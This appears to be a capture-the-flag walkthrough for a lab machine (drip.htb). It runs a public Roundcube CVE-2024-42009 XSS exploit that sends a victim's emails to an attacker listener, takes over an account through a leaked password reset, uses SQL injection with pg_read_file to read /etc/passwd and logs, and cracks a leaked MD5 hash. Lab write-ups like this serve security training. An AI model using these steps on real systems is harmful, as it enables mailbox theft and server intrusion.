![](https://github.com/user-attachments/assets/8278069b-610a-4c6d-a7b6-101029e255af)

## 1. Recon

### 1.1. Port Scan `nmap`

Quick initial scan to find open ports:

```console
root@kali:~# nmap -sS -p- --min-rate 100000 -Pn 10.10.11.54
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 08:34 +08
Nmap scan report for 10.10.11.54
Host is up (0.013s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.53 seconds
```

Script and version scan on open ports:

```console
root@kali:~# nmap -Pn -p 22,80 -sCV 10.10.11.54
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 08:34 +08
Nmap scan report for 10.10.11.54
Host is up (0.0054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey:
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
```

## 2. Exploring Roundcube Webmail

### 2.1. Looking around

The web app is at `http://drip.htb/`:

```console
root@kali:~# curl 10.10.11.54
<meta http-equiv="refresh" content="0; url=http://drip.htb/" />
```

_Sign In_ links to `http://mail.drip.htb/`:

![](https://github.com/user-attachments/assets/4ee1c489-f446-4668-b63f-547648e37102)

Which is Roundcube Webmail:

![](https://github.com/user-attachments/assets/56f7f86b-5c0c-4bbb-a5fd-da7e6cb9c0ab)

_Sign Up_ links to account registration page:

![](https://github.com/user-attachments/assets/f36f0c12-8848-4a6e-b2bb-c50bee487843)

Register account and sign in, version is `1.6.7`:

![](https://github.com/user-attachments/assets/4825f5d1-8351-43b9-9d7d-641949bb3c52)

Note the `drip.darkcorp.htb` domain from _Headers_:

![](https://github.com/user-attachments/assets/367fb443-b91e-457f-87c8-7b694c22eac0)

### 2.2. CVE-2024-42009

[CVE-2024-42009](https://github.com/advisories/GHSA-j43g-prf4-578j): A Cross-Site Scripting vulnerability in Roundcube through 1.5.7 and 1.6.x through 1.6.7 allows a remote attacker to steal and send emails of a victim via a crafted e-mail message that abuses a Desanitization issue in message_body() in program/actions/mail/show.php.

Intercept the _Contact Us_ request via Burp Suite:

![](https://github.com/user-attachments/assets/4da2f0de-3c74-463e-9753-96da2e6c70c3)

![](https://github.com/user-attachments/assets/acfb7fba-0df8-4e14-91bb-583814e72f60)

Change `recipient=support%40drip.htb` into `recipient=test%40drip.htb` and forward the edited request to hijack the email

An email `bcase@drip.htb` is discovered that can be used for the XSS exploit:

![](https://github.com/user-attachments/assets/82b2372e-c795-4173-8b39-b7a8024f6d0c)

Prepare [CVE-2024-42009-PoC](https://github.com/DaniTheHack3r/CVE-2024-42009-PoC):

```console
root@kali:~# git clone https://github.com/DaniTheHack3r/CVE-2024-42009-PoC
Cloning into 'CVE-2024-42009-PoC'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 9 (delta 2), reused 4 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 8.00 KiB | 8.00 MiB/s, done.
Resolving deltas: 100% (2/2), done.

root@kali:~# python3 -m venv CVE-2024-42009-PoC

root@kali:~# cd CVE-2024-42009-PoC/

root@kali:~/CVE-2024-42009-PoC# bin/pip3 install -r requirements.txt
⋮
⋮
Successfully installed Mako-1.3.10 MarkupSafe-3.0.2 PyNaCl-1.5.0 PySocks-1.7.1 Pygments-2.19.1 ROPGadget-7.6 bcrypt-4.3.0 beautifulsoup4-4.13.4 capstone-6.0.0a4 certifi-2025.4.26 cffi-1.17.1 charset-normalizer-3.4.2 colored-traceback-0.4.2 cryptography-45.0.2 idna-3.10 intervaltree-3.1.0 packaging-25.0 paramiko-3.5.1 plumbum-1.9.0 psutil-7.0.0 pwntools-4.14.1 pycparser-2.22 pyelftools-0.32 pyserial-3.5 python-dateutil-2.9.0.post0 requests-2.32.3 rpyc-6.0.2 six-1.17.0 sortedcontainers-2.4.0 soupsieve-2.7 typing_extensions-4.13.2 unicorn-2.1.2 unix-ar-0.2.1 urllib3-2.4.0 zstandard-0.23.0
```

Execute the exploit:

```console
root@kali:~/CVE-2024-42009-PoC# bin/python3 exploit.py -u http://drip.htb/contact -r bcase@drip.htb -l 10.10.14.3 -p 4444
[*] Crafting payload for http://drip.htb/contact with recipient bcase@drip.htb
[*] Sending payload to http://drip.htb/contact with recipient bcase@drip.htb
[*] Starting HTTP server on port 4444
[+] HTTP server listening on port 4444
[*] Waiting for emails... (Press Ctrl+C to stop manually)
[*] POST request to: /?emails=found
[+] Received 3 emails!
```

Receive information:

```console
------------------------------------------------------------
📧 EMAIL UID: 1
------------------------------------------------------------
From: no-reply@drip.htb
Subject: Welcome to DripMail

Message:
Hi bcase,
Welcome to DripMail! We're excited to provide you with convenient email solutions! If you need help, please reach out to us at
support@drip.htb
.
------------------------------------------------------------


------------------------------------------------------------
📧 EMAIL UID: 2
------------------------------------------------------------
From: ebelford
Subject: Analytics Dashboard

Message:
Hey Bryce,
The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.
If you encounter any issues or have feedback, let me know so I can address them promptly.
Thanks
------------------------------------------------------------

[+] Email exfiltration complete! Shutting down server...
[*] Shutting down server...
[+] Server stopped successfully!
```

### 2.3. Getting access to `dev-a3f1-01.drip.htb`

![](https://github.com/user-attachments/assets/706d9d12-dd8e-4988-9b62-48e3b912e8bb)

![](https://github.com/user-attachments/assets/91727468-5214-43a8-ba57-d31ada02e822)

![](https://github.com/user-attachments/assets/4bc048cf-0899-46ac-97c9-f7675e4b510c)

Run the CVE-2024-42009 exploit again to receive the password reset link:

```console
------------------------------------------------------------
📧 EMAIL UID: 3
------------------------------------------------------------
From: no-reply@drip.htb
Subject: Reset token

Message:
Your reset token has generated.  Please reset your password within the next 5 minutes.
You may reset your password here:
http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aMT8tg.jgx5a6ktRvXvrWoyf2rimlViZqE
------------------------------------------------------------
```

![](https://github.com/user-attachments/assets/2a17c94a-5c16-4cd1-97b0-3d2be55369fb)

![](https://github.com/user-attachments/assets/55d9d9f5-86fb-49b9-8272-beb6f2255af8)

### 2.4. SQL Injection

The search function at `/analytics` is vulnerable to SQL injection with a simple `''; <command>;` injection vector

#### Reading `/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
postfix:x:103:111::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:104:113:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:105:114:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
vmail:x:5000:5000::/home/vmail:/usr/bin/nologin
avahi:x:106:115:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
ntpsec:x:107:116::/nonexistent:/usr/sbin/nologin
sssd:x:108:117:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
_chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
```

Reading a PostgreSQL log file with `''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0, 10000000);` reveals password hash for `ebelford`

```
UPDATE Users SET password 8bbd7f88841b4223ae63c8848969be86 WHERE username = ebelford;
```

Cracking hash with hashcat

```console
root@kali:~# hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
⋮

8bbd7f88841b4223ae63c8848969be86:ThePlague61780

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 8bbd7f88841b4223ae63c8848969be86
⋮
```

Credential discovered: `ebelford`/`ThePlague61780`
